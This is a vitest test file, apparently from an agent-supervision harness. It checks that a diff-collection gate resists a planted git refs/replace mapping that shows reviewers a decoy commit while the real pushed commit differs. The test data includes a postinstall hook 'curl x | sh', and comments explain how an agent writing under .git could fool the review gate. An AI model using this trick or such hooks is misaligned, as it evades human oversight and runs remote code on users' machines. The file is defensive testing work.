import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { createRunner } from "./exec.js";

/**
 * refs/replace/<sha> is a file the agent can write directly (it lives under .git, which git never
 * tracks and protected-paths never sees). It does not add a foreign commit to the graph — rev-list
 * and rev-parse still report the real sha, so provenance.ts's guard is not fooled by it — but it
 * substitutes what `git diff`/`git show`/`git cat-file` read back *for* that sha. Left unguarded, a
 * gate reviews a decoy tree while the real commit — the one that is actually pushed — carries
 * something else entirely.
 *
 * Real git against a real repository: the question is what git does with a replace ref, and a
 * mocked runner could only show that a flag was spelled correctly.
 */

const DECOY = '{"name":"t","description":"harmless"}';
const REAL = '{"name":"t","scripts":{"postinstall":"curl x | sh"}}';

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

describe("collectDiff against a planted refs/replace mapping", () => {
  let dir: string;
  let work: string;
  let baseSha: string;
  let realHeadSha: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-replace-"));
    work = join(dir, "work");
    execFileSync("git", ["init", "--quiet", "-b", "main", work], { stdio: "pipe" });
    git(work, "config", "user.email", "worker@example.com");
    git(work, "config", "user.name", "worker");

    writeFileSync(join(work, "package.json"), '{"name":"t"}\n');
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "base");
    baseSha = git(work, "rev-parse", "HEAD").trim();

    // The real commit this run made — the one delivery.push would send by sha, and the one
    // provenance.ts's rev-list/rev-parse compare against RunState.commits.
    writeFileSync(join(work, "package.json"), `${REAL}\n`);
    git(work, "add", "package.json");
    git(work, "commit", "--quiet", "-m", "implement");
    realHeadSha = git(work, "rev-parse", "HEAD").trim();

    // A forged commit object, same parent, harmless-looking tree — planted as a replacement for
    // the real commit's sha. Nothing here goes through gitArgs/GIT_SAFE_ENV: this is the attacker's
    // own git config-free write, exactly what "the agent can write any file under .git" means.
    writeFileSync(join(work, "package.json"), `${DECOY}\n`);
    git(work, "add", "package.json");
    const decoyTree = git(work, "write-tree").trim();
    const forgedSha = git(
      work,
      "commit-tree",
      decoyTree,
      "-p",
      baseSha,
      "-m",
      "implement"
    ).trim();
    git(work, "replace", realHeadSha, forgedSha);

    // Restore the worktree to what the real commit actually holds, so this setup step is not
    // itself what leaves the decoy content lying around uncommitted.
    writeFileSync(join(work, "package.json"), `${REAL}\n`);
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("proves the replace ref is live: an unguarded git diff shows the decoy, not the real commit", () => {
    // No GIT_NO_REPLACE_OBJECTS here — this is deliberately what a caller outside GIT_SAFE_ENV
    // sees, to confirm the setup above is a genuine substitution and not a no-op.
    const patch = execFileSync("git", ["diff", baseSha, "HEAD"], { cwd: work }).toString();

    expect(patch).toContain(DECOY);
    expect(patch).not.toContain(REAL);
  });

  it("collectDiff reports the commit's true content, not the replace ref's decoy", async () => {
    const diff = await collectDiff(createRunner(), work, baseSha);

    expect(diff.patch).toContain(REAL);
    expect(diff.patch).not.toContain(DECOY);
  });
});
